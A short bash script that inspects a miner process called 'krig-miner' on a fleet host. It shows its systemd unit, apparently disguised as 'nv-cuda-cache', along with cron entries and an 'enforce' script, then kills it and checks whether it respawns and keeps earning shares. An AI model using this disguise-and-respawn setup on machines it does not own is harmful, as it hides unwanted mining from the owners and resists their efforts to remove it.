#!/bin/bash
L=/opt/fleet/logs; HN=$(hostname)
echo "=== persist2 $(date -u) host=$HN"
echo "--- unit"; systemctl cat nv-cuda-cache@0 2>&1 | head -14
echo "--- cron"; crontab -l 2>/dev/null
echo "--- enforce head"; head -12 /usr/local/bin/enf_i68868.sh 2>/dev/null; ls -la /usr/local/bin/enf_*.sh 2>/dev/null
echo "== before $(date -u)"; pgrep -c -f krig-miner
pkill -9 -f krig-miner; sleep 3
echo "== 3s after kill: $(pgrep -c -f krig-miner) procs"
sleep 45
echo "== 48s after kill: $(pgrep -c -f krig-miner) procs"
systemctl is-active nv-cuda-cache@0 nv-cuda-cache@1 2>&1
pgrep -af 'krig-miner --coin' | cut -c1-90 | head -3
tail -3 $L/krig-$HN-g0.sup.log 2>/dev/null
grep -c 'share accepted' $L/krig-$HN-g0.log 2>/dev/null
